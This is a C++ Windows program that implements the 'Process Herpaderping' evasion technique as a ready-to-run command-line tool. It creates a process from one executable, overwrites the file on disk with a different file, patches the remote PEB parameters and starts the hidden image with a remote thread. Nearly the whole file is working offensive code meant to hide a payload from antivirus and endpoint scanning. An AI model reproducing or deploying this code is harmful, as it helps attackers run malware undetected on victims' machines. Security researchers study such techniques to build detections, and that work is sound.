#include <iostream>
#include <string>
#include <locale>
#include <codecvt>
#include <windows.h>
#include "common.h"

#define MAXBUFFSIZE 8192

// convert string to wstring
	inline std::wstring to_wide_string(const std::string& input)
	{
		std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
		return converter.from_bytes(input);
	}
	// convert wstring to string 
	inline std::string to_byte_string(const std::wstring& input)
	{
		//std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
		std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
		return converter.to_bytes(input);
	}

HRESULT GetPayloadBuffer(OUT PBYTE& payloadBuff, OUT SIZE_T& payloadSize) {
#ifdef _M_X64
    LPCWSTR fileName = L"hello_x64.exe";
#else
    LPCWSTR fileName = L"hello_x86.exe";
#endif
	HANDLE hFile = CreateFileW(fileName, GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE) {
		return FALSE;
	}
	payloadSize = GetFileSize(hFile, 0);
	payloadBuff = (BYTE*)VirtualAlloc(0, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (payloadBuff == NULL) {
		return FALSE;
	}
	DWORD bytesRead = 0;
	if (!ReadFile(hFile, payloadBuff, (DWORD)payloadSize, &bytesRead, NULL)) {
		return FALSE;
	}
	CloseHandle(hFile);
	return S_OK;
}

HRESULT GetFileSizeByHandle(HANDLE handle, int64_t& size){
    LARGE_INTEGER largeInteger = {0};
    if (!GetFileSizeEx(handle, &largeInteger)){
        return E_FAIL;
    }
    size = largeInteger.QuadPart;
    return S_OK;
}

HRESULT SetFilePointByHandle(HANDLE handle, int64_t distance, uint32_t method){
    LARGE_INTEGER largeInteger;
    largeInteger.QuadPart = distance;
    if (!SetFilePointerEx(handle, largeInteger, nullptr, method)){
        return E_FAIL;
    }
    return S_OK;
}

HRESULT CopyFileByHandle(HANDLE sourceHandle, HANDLE targetHandle){
    int64_t sourceSize = 0;
    int64_t targetSize = 0;
    GetFileSizeByHandle(sourceHandle, sourceSize);
    GetFileSizeByHandle(targetHandle, targetSize);

    SetFilePointByHandle(sourceHandle, 0, FILE_BEGIN);
    SetFilePointByHandle(targetHandle, 0, FILE_BEGIN);

    int64_t remaining = sourceSize;
    char* buff = new char[MAXBUFFSIZE];
    DWORD readBytes = 0;
    DWORD writeBytes = 0;

    while (remaining > 0)
    {
        if (!ReadFile(sourceHandle, buff, MAXBUFFSIZE, &readBytes, NULL)){
            delete[] buff;
            return E_FAIL;
        }

        remaining -= readBytes;

        if (!WriteFile(targetHandle, buff, readBytes, &writeBytes, NULL)){
            delete[] buff;
            return E_FAIL;
        }
    }
    
    if (!FlushFileBuffers(targetHandle)){
        delete[] buff;
        return E_FAIL;
    }

    if (!SetEndOfFile(targetHandle)){
        delete[] buff;
        return E_FAIL;
    }

    delete[] buff;
    return S_OK;
}

HRESULT GetImageEntryOfPointRva(HANDLE handle, uint32_t& entryPointRva){
    char* buff = new char[0x1000];
    DWORD readBytes = 0;
    SetFilePointByHandle(handle, 0, FILE_BEGIN);
    if (!ReadFile(handle, buff, 0x1000, &readBytes, NULL)){
        return E_FAIL;
    }

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)buff;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(buff + dosHeader->e_lfanew);
    entryPointRva = ntHeader->OptionalHeader.AddressOfEntryPoint;
    return S_OK;
}


HRESULT ProcessHerpaderping(
    const wchar_t* sourceFileName, 
    const wchar_t* targetFileName, 
    const wchar_t* replaceFileName){
    HRESULT hr = S_OK;
    NTSTATUS status = STATUS_SUCCESS;
    std::wcout << L"[+] Source  file name: " <<  sourceFileName << std::endl;
    std::wcout << L"[+] Target  file name: " <<  targetFileName << std::endl;
    std::wcout << L"[+] Replace file name: " <<  replaceFileName << std::endl;

    HANDLE sourceHandle = CreateFileW(
        sourceFileName, 
        GENERIC_READ,
        FILE_SHARE_READ,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );
    if (sourceHandle == INVALID_HANDLE_VALUE){
        return E_FAIL;
    }
    std::cout << "[+] Get source file handle success" << std::endl;

    HANDLE targetHandle = CreateFileW(
        targetFileName, 
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        nullptr,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );
    if (targetHandle == INVALID_HANDLE_VALUE){
        return E_FAIL;
    }
    std::cout << "[+] Get target file handle success" << std::endl;

    hr = CopyFileByHandle(sourceHandle, targetHandle);
    if (FAILED(hr)){
        return hr;
    }
    std::cout << "[+] Copy source file to target file success" << std::endl;
    
    HANDLE section = nullptr;
    status = NtCreateSection(
        &section,
        SECTION_ALL_ACCESS,
        nullptr,
        nullptr,
        PAGE_READONLY,
        SEC_IMAGE,
        targetHandle
    );
    if (!NT_SUCCESS(status)){
        return E_FAIL;
    }
    std::cout << "[+] Create section success" << std::endl;

    HANDLE processHandle = nullptr;
    NtCreateProcessEx(
        &processHandle,
        PROCESS_ALL_ACCESS,
        nullptr,
        GetCurrentProcess(),
        PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
        section,
        nullptr,
        nullptr,
        0
    );
    if (!NT_SUCCESS(status)){
        return E_FAIL;
    }
    std::cout << "[+] Create process success" << std::endl;

    uint32_t entryPointRva = 0;
    GetImageEntryOfPointRva(targetHandle, entryPointRva);

    std::cout << "[+] Entry of point RVA: " << (LPVOID)entryPointRva << std::endl;

    HANDLE replaceHandle = CreateFileW(
        replaceFileName,
        GENERIC_READ,
        FILE_SHARE_READ,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );
    if (replaceHandle == INVALID_HANDLE_VALUE){
        return E_FAIL;
    }
    std::cout << "[+] Get replace file handle success" << std::endl;

    CopyFileByHandle(replaceHandle, targetHandle);
    std::cout << "[+] Copy replace file to target file success" << std::endl;

    PROCESS_BASIC_INFORMATION pbi = {0};
    status = NtQueryInformationProcess(
        processHandle,
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        nullptr
    );
    if (!NT_SUCCESS(status)){
        return E_FAIL;
    }
    std::cout << "[+] NtQueryInformationProcess success" << std::endl;
    std::cout << "[+] Remote PEB address: " << pbi.PebBaseAddress << std::endl;

    PEB_ peb = {0};
    if (!ReadProcessMemory(
        processHandle,
        pbi.PebBaseAddress,
        &peb,
        sizeof(peb),
        nullptr)
    ){
        
        return E_FAIL;
    }

    
    std::cout << "[+] Read process PEB success: " << std::endl;
    
    //WCHAR targetPath[MAX_PATH];
	UNICODE_STRING uTargetFile;
	PRTL_USER_PROCESS_PARAMETERS_ processParameters;
	//lstrcpyW(targetPath, targetFileName);
	RtlInitUnicodeString(&uTargetFile, targetFileName);

	WCHAR dllDir[] = L"C:\\Windows\\System32";
	UNICODE_STRING uDllPath = {0};
	RtlInitUnicodeString(&uDllPath, dllDir);

    UNICODE_STRING uWindowName = { 0 };
    WCHAR windowName[MAX_PATH];
    lstrcpyW(windowName, L"Process Herpaderping");
    RtlInitUnicodeString(&uWindowName, windowName);
    
    status = RtlCreateProcessParametersEx(
        (PRTL_USER_PROCESS_PARAMETERS*)&processParameters,
        &uTargetFile,
        &uDllPath, 
        NULL,
		&uTargetFile, 
        NULL, 
        &uWindowName, 
        NULL, 
        NULL, 
        NULL, 
        RTL_USER_PROC_PARAMS_NORMALIZED);
	if (!NT_SUCCESS(status)) {
        return E_FAIL;
	}
    std::cout << "[+] RtlCreateProcessParametersEx success" << std::endl;

    PVOID paramBuffer = processParameters;
	SIZE_T paramSize = processParameters->EnvironmentSize + processParameters->MaximumLength;
	paramBuffer = VirtualAllocEx(processHandle, paramBuffer, paramSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!paramBuffer) {
        return E_FAIL;
	}
    std::cout << "[+] Alloc memory in remote process" << std::endl;

    if (!WriteProcessMemory(
        processHandle, 
        processParameters, 
        processParameters,
		paramSize, 
        NULL)
    ){
        return E_FAIL;
    }
    std::cout << "[+] Fix remote process parameters" << std::endl;

    
	// Updating Process Parameters Address at remote PEB
	if (!WriteProcessMemory(processHandle, &peb.ProcessParameters, &paramBuffer, sizeof(PVOID), NULL)) {
        return FALSE;
	}
    std::cout << "[+] Update remote process PEB" << std::endl;

    HANDLE hThread = NULL;
    status = NtCreateThreadEx(
        &hThread, 
        THREAD_ALL_ACCESS,
        NULL, 
        processHandle,
		(LPTHREAD_START_ROUTINE)((size_t)peb.ImageBaseAddress + entryPointRva), 
        NULL, 
        FALSE, 
        0, 
        0, 
        0, 
        NULL
    );
	if (!NT_SUCCESS(status)) {
        return FALSE;
	}
    std::cout << "[+] Create remote thread success" << std::endl;

    return S_OK;
}

int main(int argc, char** argv) {
    if (argc != 4){
        std::cout << "[+] args: <source file name> <target file name> <replace file name>" << std::endl;
        return -1;
    }

    std::string source(argv[1]);
    std::string target(argv[2]);
    std::string replace(argv[3]);

    ProcessHerpaderping(to_wide_string(source).c_str(), to_wide_string(target).c_str(), to_wide_string(replace).c_str());
    
    return 0;
}
